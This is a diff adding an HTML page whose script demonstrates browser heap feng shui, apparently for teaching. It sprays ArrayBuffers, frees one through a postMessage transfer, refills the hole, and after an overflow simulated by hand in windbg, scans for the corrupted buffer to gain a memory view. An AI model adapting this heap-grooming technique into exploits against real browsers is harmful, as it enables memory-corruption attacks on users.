@@ -1,0 +1,63 @@
+<html>
+    <head>
+        <script>
+            var abHeaps = [];
+            var uiHeaps = [];
+
+            // Create a lot of ArrayBufferwhich is 0x10000 bytes size
+            // Set Uint32Array DataView into each ArrayBuffer objects
+            for (var i = 0; i < 4000; i++) {
+                abHeaps[i] = new ArrayBuffer(0x10000 - 8);
+                uiHeaps[i] = new Uint32Array(abHeaps[i]);
+                uiHeaps[i][0] = 0xdeadf00d;
+                uiHeaps[i][1] = i;
+            }
+
+            window.alert('Sprayed ArrayBuffer objects');
+
+            // Leaving the hole: freeing the heap
+            postMessage("", "*", [abHeaps[50]]);
+
+            setTimeout(function() { 
+
+                window.alert('Freed an ArrayBuffer object'); 
+
+                // Refill a Vulnerable object into the freed heap
+                var abVulnerable = new ArrayBuffer(0x10000 - 8);
+                var uiVulnerable = new Uint32Array(abVulnerable);
+
+                uiVulnerable[0] = 0xbaadf00d;
+
+                window.alert('Refilled a vulnerable object into the freed heap');
+
+
+                // Boom! trigger the vulnerability manually using windbg
+                // s 0 L?30000000 0d f0 ad ba
+                // e <vulnerable object's address> + 0x10000 41 41 41 41 41 41 41 41
+
+                window.alert('Boom!! the Security Vulnerability');
+
+                // Find memory view or crafted object
+                var i = 0;
+                for (; i < 4000; i++) {
+                    if (i == 50) continue;
+                    if (uiHeaps[i][0] != 0xdeadf00d)
+                        break;
+                }
+
+                if (i == 4000) {
+                    window.alert('heap feng-shui failed');
+                    return;
+                }
+                
+                var mv = uiHeaps[i];
+                
+                window.alert('Found the crafted object by Security Vulnerability');
+
+                window.alert(mv[0].toString(16));
+
+            }, 100);
+
+        </script>
+    </head>
+</html>
